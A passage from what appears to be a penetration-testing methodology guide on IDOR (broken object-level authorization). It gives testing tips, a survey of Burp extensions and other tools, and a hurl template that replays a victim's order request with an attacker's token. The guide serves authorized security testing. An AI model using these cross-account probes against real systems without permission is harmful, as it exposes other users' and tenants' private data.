   `node` frequently ignores the per-type resolver's ownership check because the framework routes it through a Relay-generic loader.
5. In multi-tenant apps, vary org headers, subdomains, and path params independently.
   A single-vector Tenant Isolation test misses selector drift between the gateway and the service; the two-vector matrix (my-token × foreign-tenant-selector) is where the interior bugs live.
6. Check batch/bulk operations and background job endpoints; they frequently skip per-item checks.
   A batch handler that authorizes the *request* once and processes items in a loop is the model shape for foreign-ID smuggling inside the array.
7. Inspect gateways for header trust and cache key configuration.
   A cache keyed on URL only (not `Authorization`, not `X-Tenant-ID`) is a shared-response cross-tenant leak waiting to be found.
8. Treat UUIDs as untrusted; obtain them via OSINT/leaks and test binding.
   Decode every "opaque" ID before assuming it is unguessable — UUIDv1 encodes host MAC + monotonic timestamp, ULID encodes millisecond timestamp, Snowflake encodes worker + sequence.
9. Use timing/size/ETag differentials for blind confirmation when content is masked.
   Record a baseline of legitimate-owned latency first — a cold-cache first-fetch can look like an existence signal that is actually cache warmup; the differential is the *shape* of the response across many samples, not a single measurement.
10. Prove impact with precise before/after diffs and role-separated evidence.
    An "Is enforced???" from a scanner is a candidate, not a finding; the three-clause confirmation predicate (status + body-identifier + body-content vs ground truth) is what distinguishes a report from a candidate.

## Tooling

IDOR is a two-principal differential, so the tooling is about replaying one
principal's traffic as another automatically:

- **Autorize** (Burp extension) — the standard IDOR/authz tool. Paste a
  **low-privilege** (or unauthenticated) session's cookie/`Authorization`
  header into its config, then browse as the **high-privilege** user; Autorize
  replays every request with the low-priv creds and labels each
  `Bypassed!` / `Enforced` / `Is enforced???` — surfacing broken object- and
  function-level checks across the whole app as you click. Add the token header
  to its "match/replace" and enable "unauthenticated" replay for a third column.
  The `Is enforced???` bucket is Autorize telling you the two responses were too
  similar for it to decide — resolve manually against the confirmation predicate.
- **AuthMatrix** (Burp extension) — table-shaped role/endpoint matrix; define
  named roles, mark expected accessible/denied cells, and Autorize-style replay
  fills the grid so a mis-coloured cell is the finding. Better than Autorize for
  role-heavy apps where the *expected* matrix has non-trivial structure.
- **Auth Analyzer** (Burp extension) — multiple named sessions with
  auto-extraction of per-response CSRF tokens/IDs, and parameter chaining
  (grab a fresh `id` from one response and reuse it) — better for multi-step
  and CSRF-token flows.
- **arjun** — hidden-parameter discovery (in Reconnaissance) to widen the
  reference surface (`?as_user=`, `?owner_id=`) before the differential fires.
- **Scripted two-account differ** — for APIs, a short `python`/`hurl` harness
  that fires the same request with token A then token B and diffs
  status/body/identifier is often faster than a GUI; the diff must be over the
  three confirmation-predicate clauses (status, body-identifier, body-content
  vs ground-truth), not just status. Load `hurl` for a reviewable version.
  Illustrative shape (hurl file):
  ```
  # ground-truth read by owner
  GET https://target/api/orders/{{VICTIM_ORDER_ID}}
  Authorization: Bearer {{VICTIM_TOKEN}}
  HTTP 200
  [Captures]
  ground_truth_body: body
  ground_truth_id: jsonpath "$.id"

  # cross-account probe by attacker
  GET https://target/api/orders/{{VICTIM_ORDER_ID}}
  Authorization: Bearer {{ATTACKER_TOKEN}}
  HTTP *
  [Asserts]
  # the three confirmation clauses — any single false-negative kills the finding
  status < 300
  jsonpath "$.id" == "{{VICTIM_ORDER_ID}}"
  body contains "{{ground_truth_body_excerpt}}"
  ```
- **grpcurl** — for gRPC-shape IDOR, fire the same unary call under each identity's metadata (`-H "authorization: Bearer …"`); the confirmation shape is the same. See `broken_function_level_authorization` for the gRPC-native tooling detail.
- **AuthProbe** (reference implementation, Barach) — OpenAPI-driven multi-identity
  BOLA scanner (github.com/jbarach2012/AuthProbe); useful as an OpenAPI-shaped
  companion when the target ships a spec, and as a study of the two-signal
  enumeration probe. The tool reports full detection of every planted
  cross-identity read on its synthetic recruitment benchmark; treat that as a
  self-reported benchmark, not a universal ceiling.

Whatever the tool flags, confirm manually with the owner-vs-non-owner evidence
pair and the three-clause confirmation predicate — a scanner hit is a candidate,
not a finding.

## Summary

IDOR is confirmed by a two-account differential: same request, two identities, one succeeds on the other's object, and the response body identifier and content match a ground-truth fetch by the true owner. Cover the six families (Direct Object Reference, Action-Level Object, Tenant Isolation, Workflow-Context, Chained Disclosure, Object Rebinding) across every transport; do not stop at reads.

IDOR is the object axis; load `broken_function_level_authorization` for the function axis and chain the two for the highest-impact findings.
